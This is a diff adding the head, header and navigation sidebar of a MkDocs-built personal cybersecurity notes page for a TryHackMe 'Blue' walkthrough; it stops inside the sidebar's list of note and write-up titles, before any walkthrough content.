@@ -1,0 +1,2902 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A collection of notes and writeups from my journey through cyber security concepts.">
+      
+      
+        <meta name="author" content="Nouman Noor">
+      
+      
+        <link rel="canonical" href="https://nanoor.github.io/CyberSec/walkthroughs/thm/blue/">
+      
+      
+        <link rel="prev" href="../basicpentesting/">
+      
+      
+        <link rel="next" href="../commandinjection/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.46">
+    
+    
+      
+        <title>Blue - CyberSec</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.6f8fc17f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#reconosint" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="CyberSec" class="md-header__button md-logo" aria-label="CyberSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CyberSec
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Blue
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1M8 13h8v-2H8zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4a5 5 0 0 0 5-5 5 5 0 0 0-5-5"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../notes/misc/shellstabilisation/" class="md-tabs__link">
+          
+  
+    
+  
+  Notes
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../activedirectorybasics/" class="md-tabs__link">
+          
+  
+    
+  
+  Walkthroughs
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="CyberSec" class="md-nav__button md-logo" aria-label="CyberSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>
+
+    </a>
+    CyberSec
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Notes
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Misc
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Misc
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/misc/shellstabilisation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shell Stabilisation
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Network
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Network
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/network/dns/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/network/osimodel/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OSI Model
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Privilege Escalation (Linux)
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Privilege Escalation (Linux)
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/crontab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cron Jobs
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/passwdshadow/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Passwd/Shadow File
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/pathvariable/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Path Variable
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../notes/privesc_linux/suid/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SUID
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Walkthroughs
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Walkthroughs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    THM
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            THM
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../activedirectorybasics/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory Basics
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Advent of Cyber 2022
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Advent of Cyber 2022
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day1/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 1 - Frameworks
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 2 - Log Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day3/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 3 - OSINT
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 4 - Scanning
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 5 - Brute Force
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 6 - Email Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 7 - Cyber Chef
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 8 - Smart Contracts
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day9/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 9 - Pivoting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day10/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 10 - Hack a Game
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day11/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 11 - Memory Forensics
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day12/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 12 - Malware Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day13/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 13 - Packet Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day14/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 14 - Web Applications
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day15/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 15 - Secure Coding (Securing File Upload)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day16/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 16 - Secure Coding (SQLi)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day17/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 17 - Secure Coding (Regular Expressions)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day18/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 18 - Sigma
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day19/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 19 - Hardware Hacking
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day20/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 20 - Firmware Reverse Engineering
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adventofcyber2022/day21/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 21 - MQTT
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../authenticationbypass/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Authentication Bypass
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../basicpentesting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Basic Pentesting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
